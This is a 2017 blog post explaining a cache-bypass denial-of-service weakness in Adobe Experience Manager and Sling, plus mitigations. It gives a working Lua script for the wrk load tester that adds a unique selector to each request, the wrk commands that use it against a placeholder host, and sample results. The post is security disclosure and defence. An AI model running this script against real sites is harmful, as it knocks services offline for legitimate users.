+++
date = "2017-05-01T13:06:36-04:00"
title = "AEM, Sling selector-based cache override DDOS attack vector"
tags = [ "aem", "sling", "jcr" ]
aliases = [ "/blog/aem-sling-selector-based-cache-override-ddos-attack-vector/", "/blurbs/aem-sling-selector-based-cache-override-ddos-attack-vector/" ]
+++

Adobe Experience Manager ([AEM](https://docs.adobe.com/content/docs/en/aem/6-3.html)), formerly known as CQ, is a best
  of breed, very popular, very expensive content management system consisting of many Apache-Foundation open source and
  proprietary Adobe Marketing Cloud tech. In AEM **everything** is content and [Sling](https://sling.apache.org/) is
  the glue that resolves HTTP requests via the [JCR](http://jackrabbit.apache.org/jcr/index.html) and renders HTTP
  responses.

One of the constructs in Sling's [URL decomposition](https://sling.apache.org/documentation/the-sling-engine/url-decomposition.html)
  is that of `selectors`. Selectors are none to many "attributes" found immediately after a resource path but before
  the resource's extension. For example:

```text
# no selector
/path/to/something.html

# one selector (abc123)
/path/to/something.abc123.html

# two selectors (ding, dong)
/path/to/something.ding.dong.html
```

These selectors are useful and generally harmless, especially when used in internal systems (like authoring). However,
  great care should be taken when deciding if and how to allow requests containing them through the various layers
  of application and network architecture for an installation/implementation.

## Attack vector

From a security point of view, the main issue with Sling is that its dynamic nature makes it vulnerable to specific
  types of attacks. Improper selector handling/configuration at the CDN or [Dispatcher](https://docs.adobe.com/docs/en/dispatcher.html)
  (static disk cache on IIS/Apache) can allow for outright by-passing of caches. Caches are an important architectural
  component of any system and they are especially important for AEM. AEM application servers are notoriously slow at rendering
  resource responses as _pages_ under load. An attack capable of delivering a high number of requests in a short period of
  time that all bypass caching infrastructure would quickly overwhelm and block thread pools established on the upstream
  AEM app servers.

## Simple attack test

I tested a few, large name systems with this type of shall we say "load tests" last week and found every single one
  unprotected and vulnerable. The following demonstrates the test, which lasted for 10-15 seconds...

First off, a simple Lua-based counter that will inject a number as a selector for each request issued from a CLI load
  testing app [wrk](https://github.com/wg/wrk)...

```text
counter = 0

request = function()
    local path = string.gsub(wrk.path, ".html", "." .. counter .. ".html")
    counter = counter + 1
    return wrk.format(wrk.method, path, wrk.headers, wrk.body)
end
```   

To execute the test, first, pick a target page to test on the target AEM system. Then, run `wrk` with a high connection
  and thread count in two passes; first without the above Lua script, then with the Lua script. The following is an example
  block with results from an actual test (not the endpoint listed)...

**Note**: Only test against target systems for which you have permission or operational control of.

```text

# test without Lua script
#
wrk -c 200 -t 50 -d 15s https://www.targethost.com/path/to/some/resource.html
Running 30s test @ https://www.targethost.com/path/to/some/resource.html
  50 threads and 200 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     1.01s   417.11ms   1.97s    60.60%
    Req/Sec     5.84      4.97    30.00     93.17%
  5722 requests in 30.09s, 421.57MB read
  Socket errors: connect 0, read 0, write 0, timeout 4
Requests/sec:    190.18
Transfer/sec:     14.01MB

# test with Lua script
#
wrk -c 200 -t 50 -d 15s -s counter.lua https://www.targethost.com/path/to/some/resource.html
Running 30s test @ https://www.targethost.com/path/to/some/resource.html
  50 threads and 200 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency    92.93ms  173.21ms   1.26s    97.12%
    Req/Sec     1.48      3.22    20.00     89.49%
  647 requests in 30.10s, 47.42MB read
  Socket errors: connect 0, read 0, write 0, timeout 543
Requests/sec:     21.49
Transfer/sec:      1.58MB
```

The example command usage and output shows the target system is allowing requests through with erroneous selectors. This
  is resulting in far reduced throughput and elevated error rates.

In this situation the various layers of caching incur cache misses and call upstream to additional cache layers and so
  on until they hit the target AEM application server. At that point, the AEM application servers receive requests in
  rapid succession placing a strain on the servers available thread pool. In extreme cases, it is easy to see how this
  would cause service interruptions for legitimate users.

## Attack vector mitigation

The easiest way of protecting against this type of attack, or suffix-based attacks, which are nearly identical, is to
  flat out restrict them at the Distpacher. While this approach provides protection, it could limit or break existing
  custom and OOTB functionality provided by the platform. Adobe [recommends](https://docs.adobe.com/docs/en/aem/6-3/administer/security/security-checklist.html)
  executing selector validation at the page level (it should be resource) which would require custom code in various
  templates, base templates, etc. It might also require your authors understand and notate when certain selectors might be
  used based on the components on the page. Its not super practical. Sites likely either flat out block selectors or
  are open to potential attack.

A long, long while ago I threw up a [gist](https://gist.github.com/joshdurbin/6581142) attempting to help solve this
  problem. In the coming weeks check this space for a solution aimed at the source of truth, the app server, but with
  flexibility and performance considerations in mind!
